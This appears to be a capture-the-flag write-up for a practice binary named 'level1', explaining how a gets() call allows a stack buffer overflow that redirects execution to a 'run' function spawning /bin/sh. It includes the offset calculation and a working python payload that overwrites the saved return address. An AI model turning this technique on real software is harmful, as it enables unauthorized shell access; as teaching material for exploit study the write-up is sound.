The binary `level1`'s main is very simple. It just creates a buffer on the stack and calls `gets` to fill it.

There is an other function though, called `run`. This function directly calls `/bin/sh` in a system call.

The only question is, how can we access `run` without it being called anywhere?

We can do so by doing a stack buffer overflow attack. The idea is to overflow the buffer in main to overwrite the eip value that is saved in the stack just after the data pointed by ebp.

```
|---------| <- `esp`
| buf addr|
|---------|
|         |
| buffer  |
|         |
|         |
|         |
|         |
|---------| <- `ebp`
| old ebp |
|---------|
| old eip |
|---------|
```

By reading the disassembly, we can calculate that the buffer starts 76 bytes before `old eip`:

> size of `ebp` + alignment offset + stack allocation - start of the buffer in the stack  
> 4 + 8 + 80 - 16 = 76

So, knowing that `run`'s address is `0x08048444`, we can overwrite `eip` with this value by doing this:

```bash
python -c 'print "A" * 76 + "\x44\x84\x04\x08"'
```

Now, to be able to actually run whatever we want we need to do:

```bash
python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/01
cat /tmp/01 - | ./level1
```
